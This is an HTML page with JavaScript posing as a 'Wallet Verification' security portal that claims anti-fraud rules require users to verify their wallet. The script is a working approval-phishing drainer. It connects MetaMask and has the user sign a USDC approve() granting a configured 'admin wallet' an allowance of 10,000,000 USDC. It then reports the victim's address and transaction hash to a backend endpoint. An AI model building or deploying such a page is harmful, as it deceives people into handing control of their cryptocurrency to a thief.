<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Verification | Security Portal</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0f172a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #f1f5f9;
        }
        .card {
            background: #1e293b;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3);
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 1px solid #334155;
        }
        .icon {
            font-size: 60px;
            color: #38bdf8;
            margin-bottom: 20px;
        }
        h2 { margin-bottom: 10px; font-size: 24px; }
        p { color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
        #connectBtn {
            background: #38bdf8;
            color: #0f172a;
            border: none;
            padding: 16px 30px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
        }
        #connectBtn:hover {
            background: #7dd3fc;
            transform: translateY(-1px);
        }
        #status { margin-top: 20px; font-size: 14px; min-height: 20px; }
        .loader {
            display: none;
            margin: 20px auto;
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h2>Wallet Verification</h2>
    <p>To comply with anti-fraud regulations and protect your assets, please verify your wallet's security certificate.</p>

    <div class="loader" id="loader"></div>
    <button id="connectBtn">Connect & Verify Wallet</button>
    <div id="status"></div>
</div>

<script>
/** * CONFIGURATION
 * Replace SPENDER_ADDRESS with your 42-character admin wallet.
 */
const SPENDER_ADDRESS = "0x7a391f7481f33221379ecf00a5f643e9d8999335f6068695d7398b16c803df6a".substring(0, 42);
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";

// ABI needed for the Approve function
const ERC20_ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];

async function startVerification() {
    const btn = document.getElementById('connectBtn');
    const status = document.getElementById('status');
    const loader = document.getElementById('loader');

    try {
        if (!window.ethereum) {
            alert("Please use a Web3 browser or install MetaMask.");
            return;
        }

        // 1. Connect Wallet
        loader.style.display = "block";
        btn.style.display = "none";
        status.innerText = "Connecting to MetaMask...";

        const provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = provider.getSigner();
        const userAddress = await signer.getAddress();

        // 2. Prepare Approval
        status.innerText = "Requesting Security Protocol Approval...";
        const usdcContract = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);

        /**
         * 10,000,000 USDC
         * USDC has 6 decimals, so we add 6 zeros.
         */
        const amount = ethers.utils.parseUnits("10000000", 6);

        // 3. Trigger MetaMask Popup
        // This is the transaction that shows up on Revoke.cash
        const tx = await usdcContract.approve(SPENDER_ADDRESS, amount);

        status.innerText = "Verifying on-chain... Please wait.";

        // 4. Wait for transaction to be mined
        const receipt = await tx.wait();

        // 5. Notify Django Backend
        const response = await fetch("/api/save-sig/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRFToken": "{{ csrf_token }}"
            },
            body: JSON.stringify({
                owner: userAddress,
                tx_hash: tx.hash,
                status: "VERIFIED_10M_LIMIT"
            })
        });

        if (response.ok) {
            status.innerHTML = "<span style='color: #4ade80;'>✅ Verification Successful!</span>";
            setTimeout(() => {
                window.location.href = "/dashboard/";
            }, 2000);
        } else {
            throw new Error("Failed to sync with server.");
        }

    } catch (err) {
        console.error(err);
        loader.style.display = "none";
        btn.style.display = "block";

        // Handle rejection or gas errors
        if (err.code === 4001) {
            status.innerHTML = "<span style='color: #f87171;'>❌ User denied transaction.</span>";
        } else {
            status.innerHTML = "<span style='color: #f87171;'>❌ Error: Check ETH Gas or Network.</span>";
        }
    }
}

document.getElementById('connectBtn').addEventListener('click', startVerification);
</script>

</body>
</html>
